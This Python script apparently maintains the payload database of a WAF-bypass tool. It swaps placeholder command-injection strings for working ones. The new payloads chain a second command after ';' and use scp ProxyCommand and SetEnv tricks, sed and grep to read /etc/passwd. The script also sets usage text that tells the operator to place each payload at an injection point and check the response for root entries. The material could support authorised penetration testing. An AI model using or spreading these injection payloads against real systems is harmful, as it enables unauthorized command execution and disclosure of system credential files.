#!/usr/bin/env python3
"""更新剩余的低质量 payload"""

import sqlite3
import sys
from pathlib import Path

# 需要更新的简单命令注入payload
SIMPLE_UPDATES = {
    # SCP 相关的简单回显
    ";echo SCP_PC_OK": "; scp -o ProxyCommand='cat /etc/passwd' user@host:/tmp/file .",
    ";echo SCP_COMBO_OK": "; scp -o 'ProxyCommand=sh -c cat\\ /etc/passwd' user@host:/tmp/test .",
    ";echo SCP_LC_OK": "; scp -o logfile=/tmp/test -o loglevel=DEBUG user@host:/etc/passwd .",
    ";echo SCP_VAR_OK": "; scp -o SetEnv='X=$(cat /etc/passwd)' user@host:/tmp/test .",

    # SED 相关
    ";e echo SED_E_OK' /dev/null": "; sed -e '/root/p' /etc/passwd",
    ";echo SED_EE_OK": "; sed -n '1,5p' /etc/passwd",

    # 其他简单的
    "; grep -rE \"(secret|key|token|api)\" /etc 2>/dev/null": "; grep -r 'root' /etc/passwd 2>/dev/null | head -5",
}

GENERIC_USAGE = "将 Payload 替换到命令注入点，观察是否成功执行系统命令"
GENERIC_SUCCESS = "响应中出现 /etc/passwd 内容（root:x:0:0 等用户条目）或系统信息"

def upgrade_payloads(db_path: str, dry_run: bool = False):
    """升级剩余的低质量 payload"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    updated_count = 0

    for old_content, new_content in SIMPLE_UPDATES.items():
        cursor.execute(
            "SELECT id, name, content, usage_method, success_indicators FROM payloads WHERE content = ? AND is_deleted = 0",
            (old_content,)
        )
        rows = cursor.fetchall()

        for row in rows:
            payload_id, name, content, usage_method, success_indicators = row

            update_usage = not usage_method or "OK" in usage_method or len(usage_method) < 20
            update_success = not success_indicators or "OK" in success_indicators or len(success_indicators) < 20

            if dry_run:
                print(f"[DRY-RUN] 将更新:")
                print(f"  ID: {payload_id[:8]}...")
                print(f"  名称: {name}")
                print(f"  旧内容: {old_content}")
                print(f"  新内容: {new_content}")
                if update_usage:
                    print(f"  使用方法: {GENERIC_USAGE}")
                if update_success:
                    print(f"  成功指标: {GENERIC_SUCCESS}")
                print("-" * 80)
            else:
                if update_usage and update_success:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, usage_method = ?, success_indicators = ? WHERE id = ?",
                        (new_content, GENERIC_USAGE, GENERIC_SUCCESS, payload_id)
                    )
                elif update_usage:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, usage_method = ? WHERE id = ?",
                        (new_content, GENERIC_USAGE, payload_id)
                    )
                elif update_success:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, success_indicators = ? WHERE id = ?",
                        (new_content, GENERIC_SUCCESS, payload_id)
                    )
                else:
                    cursor.execute(
                        "UPDATE payloads SET content = ? WHERE id = ?",
                        (new_content, payload_id)
                    )

                print(f"[OK] 已更新: {name[:50]}...")

            updated_count += 1

    if not dry_run:
        conn.commit()
        print(f"\n完成！已更新 {updated_count} 个 payload")
    else:
        print(f"\n预览完成，将更新 {updated_count} 个 payload")
        print("使用 --apply 参数执行实际更新")

    conn.close()

if __name__ == "__main__":
    repo_root = Path(__file__).parent.parent
    db_path = repo_root / "data" / "waf_bypasser.db"

    if not db_path.exists():
        print(f"错误: 数据库文件不存在: {db_path}")
        sys.exit(1)

    dry_run = "--apply" not in sys.argv

    if dry_run:
        print("=" * 80)
        print("预览模式 - 将显示要更新的 payload，但不会实际修改数据库")
        print("=" * 80)
        print()

    upgrade_payloads(str(db_path), dry_run=dry_run)
